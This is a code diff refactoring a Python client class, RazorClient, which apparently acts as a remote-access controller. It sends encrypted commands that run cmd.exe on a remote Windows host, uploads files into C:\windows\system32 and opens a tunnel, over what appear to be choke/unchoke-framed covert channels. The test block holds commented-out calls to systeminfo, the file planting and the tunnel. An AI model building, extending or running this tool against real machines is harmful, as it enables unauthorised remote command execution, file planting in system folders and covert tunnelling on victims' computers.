@@ -32,6 +32,13 @@ class RazorClient(TortunClient):
         buf = self.enc.encrypt(buf)
         self.send_sequence(buf)
 
+    def send_receive(self, buf):
+        self._initiate_sending()
+        self.send_buffer(buf)
+        self._wait_for_unchoke()
+        self._finalize_sending()
+        return self.read_buffer()
+
     def _finalize_sending(self):
         self.choke()
         self._reject_last_request()
@@ -42,11 +49,7 @@ class RazorClient(TortunClient):
 
     def exec(self, executable, params=""):
         payload = RunCommand(executable, params).to_razor_payload()
-        self._initiate_sending()
-        self.send_buffer(payload)
-        self._wait_for_unchoke()
-        self._finalize_sending()
-        cmd_out = self.read_buffer()
+        cmd_out = self.send_receive(payload)
         return cmd_out.decode('utf-8')
 
     def upload_file(self, local_path, remote_path):
@@ -60,9 +63,8 @@ class RazorClient(TortunClient):
                 self.send_buffer(payload)
         self._finalize_sending()
 
-    def tunnel(self, ip, port):
-        with RazorTunneler(ip, port, self) as t:
-            pass
+    def start_tunnel(self, ip, port):
+        return RazorTunneler(ip, port, self)
 
 
 if __name__ == '__main__':
@@ -74,7 +76,9 @@ if __name__ == '__main__':
     r.connect(("127.0.0.1", 6888))
     r.initiate_session()
     # print(r.exec("cmd.exe", r"/c copy C:\users\defsa\pictures\test.jpg C:\windows\system32\test.jpg"))
-    print(r.exec("cmd.exe", r"/c systeminfo"))
+    # print(r.exec("cmd.exe", r"/c systeminfo"))
     # print(r.exec("cmd.exe", r"/c copy C:\Users\defsa\Pictures\test2.jpg C:\Windows\System32\ "))
-    r.upload_file(r"C:\users\defsa\pictures\test.jpg", r"C:\windows\system32\test.jpg")
-    r.tunnel("127.0.0.1", 8888)
+    # r.upload_file(r"C:\users\defsa\pictures\test.jpg", r"C:\windows\system32\test.jpg")
+    # t = r.start_tunnel("127.0.0.1", 8888)
+    # t.start()
+    # t.stop()
